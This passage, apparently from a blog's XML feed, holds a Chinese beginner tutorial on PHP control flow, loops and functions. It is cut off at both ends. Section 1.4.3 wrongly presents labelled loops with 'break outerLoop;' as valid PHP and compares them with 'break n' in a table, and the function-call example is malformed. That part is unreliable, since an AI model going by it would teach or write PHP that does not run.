class="comment">// 输出为文件存在</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$iiii</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件存在&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件不存在&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出为文件不存在</span></span><br></pre></td></tr></table></figure></li><li><p><code>is_file($file)</code>函数用来检查是否为文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_file</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>is_dir($file)</code>函数用用户来稽查是否为目录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础入门（二）</title>
      <link href="/2025/07/15/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2025/07/15/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础入门（二）"><a href="#PHP基础入门（二）" class="headerlink" title="PHP基础入门（二）"></a>PHP基础入门（二）</h1><blockquote><p>[!NOTE]</p><p>本篇文章仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><p>​这篇文章用来理解PHP流程控制语句、函数和数组！</p><h2 id="1-流程控制语句"><a href="#1-流程控制语句" class="headerlink" title="1. 流程控制语句"></a>1. 流程控制语句</h2><p>​流程控制语句用来控制程序的执行流程，分为三种流程结构：</p><p>顺序结构、选择结构和循环结构。</p><h3 id="1-1-顺序结构"><a href="#1-1-顺序结构" class="headerlink" title="1.1 顺序结构"></a>1.1 顺序结构</h3><p>​当没有任何有关流程控制的语句时，程序默认的执行顺序，从上而下，一行一行执行。</p><h3 id="1-2-选择结构"><a href="#1-2-选择结构" class="headerlink" title="1.2 选择结构"></a>1.2 选择结构</h3><p>​程序在自上而下依次执行时，可以通过条件判断，选择性的执行某一段代码。若条件P为真，则执行A，否则执行B 。</p><h4 id="1-2-1-if语句"><a href="#1-2-1-if语句" class="headerlink" title="1.2.1 if语句"></a>1.2.1 <code>if</code>语句</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition1)&#123;</span><br><span class="line"> <span class="comment">//code1</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>(condition2)&#123;</span><br><span class="line"> <span class="comment">//code2</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="comment">//code3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>解释：</strong>上面的代码若<code>condition1</code>条件为真，则执行<code>code1</code>部分的代码；若<code>condition1</code>不为真但<code>condition2</code>为真，则执行<code>code2</code>部分的代码，若两者都不为真，则执行<code>code3</code>部分的代码。</li></ul><h3 id="1-2-2-switch语句"><a href="#1-2-2-switch语句" class="headerlink" title="1.2.2 switch语句"></a>1.2.2 <code>switch</code>语句</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$var</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> value1:</span><br><span class="line"> <span class="comment">//code</span></span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> value2:</span><br><span class="line"> <span class="comment">//code</span></span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"> <span class="comment">//code</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li><strong>解释：</strong><ul><li><code>$var</code> 是要判断的变量或表达式，程序会将其值与后续的 <code>case</code> 值进行比较；</li><li><code>case value1:</code> 表示一个匹配项：当 <code>$var == value1</code>（松散比较）时，可以有任何数量个 <code>case</code> 分支，支持不同类型：数字、字符串、常量等。</li><li><code>// code</code>对应匹配成功后执行的代码块，可以包含任意有效的 PHP 代码。</li><li><code>break;</code><strong>关键中断指令</strong>：执行完当前 case 后跳出整个 switch 结构，如果省略，程序会继续执行下一个 case 的代码（称为”case 穿透”）。</li><li><code>default:</code>当 <code>$var</code> 不匹配任何 case 时执行的默认分支，可以省略，但建议始终包含以处理意外情况，通常放在最后（非强制要求）。</li></ul></li></ul><h3 id="1-3-循环语句"><a href="#1-3-循环语句" class="headerlink" title="1.3 循环语句"></a>1.3 循环语句</h3><p>​循环语句功能：在循环条件满足的情况下，反复执行特定代码。</p><h4 id="1-3-1-while-循环"><a href="#1-3-1-while-循环" class="headerlink" title="1.3.1 while 循环"></a>1.3.1 <code>while </code>循环</h4><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 重复执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li>先判断条件后执行</li><li>条件为真时执行代码块</li><li>条件为假时跳过整个循环</li></ul><p><strong>工作流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开始</span><br><span class="line">↓</span><br><span class="line">检查条件 → false → 结束</span><br><span class="line">↓ true</span><br><span class="line">执行代码块</span><br><span class="line">↓</span><br><span class="line">返回检查条件</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$counter</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$counter</span> &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;当前计数: <span class="subst">$counter</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$counter</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">当前计数: 1</span></span><br><span class="line"><span class="comment">当前计数: 2</span></span><br><span class="line"><span class="comment">当前计数: 3</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="1-3-2-do-while循环"><a href="#1-3-2-do-while循环" class="headerlink" title="1.3.2 do-while循环"></a>1.3.2 <code>do-while</code>循环</h4><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 重复执行的代码</span></span><br><span class="line">&#125; <span class="keyword">while</span> (condition);</span><br></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li><strong>先执行一次</strong>代码块，再检查条件</li><li>条件为真时继续执行</li><li>至少执行一次代码块</li><li>结尾的分号(<code>;</code>)不能省略</li></ul><p><strong>工作流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开始</span><br><span class="line">↓</span><br><span class="line">执行代码块</span><br><span class="line">↓</span><br><span class="line">检查条件 → false → 结束</span><br><span class="line">↓ true</span><br><span class="line">返回执行代码块</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;值为: <span class="subst">$i</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="variable">$i</span> &lt;= <span class="number">3</span>);</span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">值为: 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="1-3-3-for循环"><a href="#1-3-3-for循环" class="headerlink" title="1.3.3 for循环"></a>1.3.3 <code>for</code>循环</h4><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (init; condition; increment) &#123;</span><br><span class="line">    <span class="comment">// 重复执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>组成部分</strong>：</p><ol><li>初始化表达式 (<code>init</code>)：循环开始时执行一次</li><li>循环条件 (<code>condition</code>)：每次迭代前检查</li><li>递增&#x2F;递减表达式 (<code>increment</code>)：每次迭代后执行</li></ol><p><strong>工作流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">开始</span><br><span class="line">↓</span><br><span class="line">执行init</span><br><span class="line">↓</span><br><span class="line">检查condition → false → 结束</span><br><span class="line">↓ true</span><br><span class="line">执行代码块</span><br><span class="line">↓</span><br><span class="line">执行increment</span><br><span class="line">↓</span><br><span class="line">返回检查condition</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;迭代次数: <span class="subst">$i</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">迭代次数: 0</span></span><br><span class="line"><span class="comment">迭代次数: 1</span></span><br><span class="line"><span class="comment">迭代次数: 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>高级用法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 多表达式</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>, <span class="variable">$j</span>=<span class="number">5</span>; <span class="variable">$i</span>&lt;=<span class="number">5</span>; <span class="variable">$i</span>++, <span class="variable">$j</span>--) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;i: <span class="subst">$i</span>, j: <span class="subst">$j</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无限循环</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// 需要break语句终止</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-3-4-foreach循环"><a href="#1-3-4-foreach循环" class="headerlink" title="1.3.4 foreach循环"></a>1.3.4 <code>foreach</code>循环</h4><p><strong>语法</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 $value</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用 $key 和 $value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li>专门遍历数组和对象</li><li>自动迭代数组中的每个元素</li><li>不需要维护计数器</li></ul><p><strong>工作流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开始</span><br><span class="line">↓</span><br><span class="line">获取第一个元素 → 无元素 → 结束</span><br><span class="line">↓</span><br><span class="line">执行代码块</span><br><span class="line">↓</span><br><span class="line">获取下一个元素</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$colors</span> = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历值</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$colors</span> <span class="keyword">as</span> <span class="variable">$color</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$color</span> &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出：red green blue</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历键和值</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$colors</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$color</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$index</span>: <span class="subst">$color</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">0: red</span></span><br><span class="line"><span class="comment">1: green</span></span><br><span class="line"><span class="comment">2: blue</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>高级特性</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引用遍历（修改原数组）</span></span><br><span class="line"><span class="variable">$numbers</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$numbers</span> <span class="keyword">as</span> &amp;<span class="variable">$num</span>) &#123;</span><br><span class="line">    <span class="variable">$num</span> *= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$numbers</span>); <span class="comment">// 输出：[2, 4, 6]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组遍历</span></span><br><span class="line"><span class="variable">$users</span> = [</span><br><span class="line">    [<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="number">28</span>],</span><br><span class="line">    [<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="number">32</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$user</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot; is &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;age&#x27;</span>] . <span class="string">&quot; years old.&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">Alice is 28 years old.</span></span><br><span class="line"><span class="comment">Bob is 32 years old. */</span></span><br></pre></td></tr></table></figure><p><strong>适用场景</strong>：</p><ul><li>遍历数组元素</li><li>处理关联数组</li><li>操作多维数组</li></ul><h3 id="1-4-循环控制语句"><a href="#1-4-循环控制语句" class="headerlink" title="1.4 循环控制语句"></a>1.4 循环控制语句</h3><h4 id="1-4-1-break语句"><a href="#1-4-1-break语句" class="headerlink" title="1.4.1 break语句"></a>1.4.1 <code>break</code>语句</h4><ul><li><p>立即结束整个循环。</p></li><li><p><code>break n</code> 可以指定跳出多少层循环。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 跳出循环</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出：01234</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="1-4-2-continue语句"><a href="#1-4-2-continue语句" class="headerlink" title="1.4.2 continue语句"></a>1.4.2 <code>continue</code>语句</h4><ul><li><p>跳过当前迭代，进入下一次循环。</p></li><li><p><code>continue n</code> 可以指定跳过多少层迭代。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>; <span class="comment">// 跳过本次迭代</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出：0134</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="1-4-3-循环标签"><a href="#1-4-3-循环标签" class="headerlink" title="1.4.3 循环标签"></a>1.4.3 循环标签</h4><p>​顾名思义循环标签就是给某一个循环赋予<strong>可自定义</strong>的名字，一是为了让程序更加清晰，二是为了跳出循环时可以比<code>break n</code>更加灵活，直观的操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">outerLoop:    <span class="comment">// 给外层循环贴标签</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    </span><br><span class="line">    innerLoop: <span class="comment">// 给内层循环贴标签</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">3</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span>-<span class="subst">$j</span> &quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 可以根据条件指定跳出哪个循环</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$j</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span> outerLoop; <span class="comment">// 直接跳出外层循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行后会输出: </span></span><br><span class="line"><span class="comment">// 0-0 0-1 0-2 </span></span><br><span class="line"><span class="comment">// 1-0 1-1 </span></span><br></pre></td></tr></table></figure><p><strong>循环标签 vs <code>break n</code></strong></p><table><thead><tr><th align="center">特性</th><th align="center">循环标签</th><th align="center"><code>break n</code></th></tr></thead><tbody><tr><td align="center">可读性</td><td align="center">更好（名称有意义）</td><td align="center">需数层级</td></tr><tr><td align="center">灵活性</td><td align="center">可在不同作用域使用</td><td align="center">只限连续嵌套</td></tr><tr><td align="center">可靠性</td><td align="center">修改结构不影响</td><td align="center">层级改变需调整n值</td></tr><tr><td align="center">使用场景</td><td align="center">复杂多层且需精确控制</td><td align="center">简单嵌套跳多层</td></tr></tbody></table><h2 id="2-函数"><a href="#2-函数" class="headerlink" title="2. 函数"></a>2. 函数</h2><h3 id="2-1-函数定义"><a href="#2-1-函数定义" class="headerlink" title="2.1 函数定义"></a>2.1 函数定义</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">参数<span class="number">1</span>, 参数<span class="number">2</span> = <span class="string">&quot;默认值&quot;</span></span>): 返回值类型 </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 逻辑代码</span></span><br><span class="line">    <span class="keyword">return</span> $返回值; <span class="comment">// 可直接 return &quot;结果&quot;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键特性</strong>：</p><ul><li><p><strong>默认参数</strong>：可选参数必须放在必选参数之后<code>function calc($a, $b=10) &#123;...&#125;</code>。</p></li><li><p><strong>类型声明（PHP7+增强）</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$a</span>, <span class="keyword">float</span> <span class="variable">$b</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strval</span>(<span class="variable">$a</span> + <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>无返回值时</strong>：可省略 <code>return</code> 或使用 <code>return null</code>。</p></li></ul><h3 id="2-2-函数调用"><a href="#2-2-函数调用" class="headerlink" title="2.2 函数调用"></a>2.2 函数调用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="function"><span class="keyword">function</span>(<span class="params">参数<span class="number">1</span>, 参数<span class="number">2</span></span>)</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>传参方式</strong>：<ul><li>值传递（默认）：修改形参不影响实参</li><li>引用传递：<code>function foo(&amp;$var) &#123;...&#125;</code>（在函数定义时参数前加 <code>&amp;</code> (如 <code>function foo(&amp;$param)</code>)。这种方式传递的是实参变量<strong>本身的内存地址</strong>，而不是值的拷贝。函数内部修改 <code>$param</code> 会直接影响调用处原始的 <code>$arg</code> 变量。图片中展示的是更常用的<strong>值传递</strong>。）</li></ul></li><li><strong>返回值处理</strong>：</li></ul><p>​函数执行后返回给调用者的数据叫做返回值，可以用来传递数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.没有参数，没有返回值的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有参数，没有参会值的方法&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 2.有参数，没有返回值的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;有参数，没有返回值的方法，参数是：<span class="subst">$name</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 3.有参数，有返回值的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun3</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;返回值x&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;有参数，有返回值的方法,返回值是：<span class="subst">$re</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line"><span class="title function_ invoke__">fun1</span>();</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">fun2</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">fun3</span>(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-3-匿名函数"><a href="#2-3-匿名函数" class="headerlink" title="2.3 匿名函数"></a>2.3 匿名函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 步骤1：创建匿名函数并赋值给变量</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello <span 